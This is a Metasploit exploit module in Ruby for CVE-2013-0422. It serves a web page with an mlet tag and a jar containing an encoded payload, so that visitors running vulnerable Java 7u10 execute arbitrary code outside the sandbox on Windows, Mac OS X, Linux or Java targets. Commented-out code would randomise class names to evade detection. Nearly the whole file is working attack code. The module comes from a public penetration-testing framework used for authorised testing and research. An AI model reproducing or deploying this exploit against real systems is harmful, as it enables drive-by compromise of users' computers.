##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::HttpServer::HTML

    def initialize( info = {} )

        super( update_info( info,
        'Name'          => 'Java Mlet Server',
        'Description'   => %q{
            This module abuses the JMX classes from a Java Applet to run arbitrary Java
            code outside of the sandbox as exploited in the wild in January of 2013. The
            vulnerability affects Java version 7u10 and earlier.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
        [
            'Unknown', # Vulnerability discovery
            'egypt', # Metasploit module
            'sinn3r', # Metasploit module
            'juan vazquez' # Metasploit module
        ],
        'References'    =>
        [
            [ 'CVE', '2013-0422' ]

        ],
        'Platform'      => %w{ java linux osx win },
        'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
        'Targets'       =>
        [
            [ 'Generic (Java Payload)',
                {
                    'Platform' => ['java'],
                    'Arch' => ARCH_JAVA,
                }
            ],
            [ 'Windows x86 (Native Payload)',
                {
                    'Platform' => 'win',
                    'Arch' => ARCH_X86,
                }
            ],
            [ 'Mac OS X x86 (Native Payload)',
                {
                    'Platform' => 'osx',
                    'Arch' => ARCH_X86,
                }
            ],
            [ 'Linux x86 (Native Payload)',
                {
                    'Platform' => 'linux',
                    'Arch' => ARCH_X86,
                }
            ],
        ],
        'DefaultTarget'  => 0,
        'DisclosureDate' => 'Jan 10 2013'
        ))
    end


    def setup
        path = File.join(Msf::Config.data_directory, "java", "metasploit", "MBean", "Metasploit.class")
        @mbean_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
        path = File.join(Msf::Config.data_directory, "java", "metasploit", "MBean", "MetasploitMBean.class")
        @interface_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }

        #@exploit_class_name = rand_text_alpha("Exploit".length)
        #@exploit_class.gsub!("Exploit", @exploit_class_name)
        super
    end

    def on_request_uri(cli, request)
        print_status("handling request for #{request.uri}")

        case request.uri
        when /\.jar$/i
            jar = payload.encoded_jar
            jar.add_file("metasploit/Metasploit.class", @mbean_class)
            jar.add_file("metasploit/MetasploitMBean.class", @interface_class)
            #metasploit_str = rand_text_alpha("metasploit".length)
            #payload_str = rand_text_alpha("payload".length)
            #jar.entries.each { |entry|
            #    entry.name.gsub!("metasploit", metasploit_str)
            #    entry.name.gsub!("Payload", payload_str)
            #    entry.data = entry.data.gsub("metasploit", metasploit_str)
            #    entry.data = entry.data.gsub("Payload", payload_str)
            #}
            jar.build_manifest

            send_response(cli, jar, { 'Content-Type' => "application/octet-stream" })
        when /\/$/
            payload = regenerate_payload(cli)
            if not payload
                print_error("Failed to generate the payload.")
                send_not_found(cli)
                return
            end
            send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })
        else
            send_redirect(cli, get_resource() + '/', '')
        end

    end

    def generate_html
        html = %Q|<mlet code=metasploit.Metasploit archive=#{rand_text_alpha(8)}.jar name=#{rand_text_alpha(8)}:name=#{rand_text_alpha(8)},id=#{rand_text_alpha(8)} ></mlet>|
#        return html
    end

end
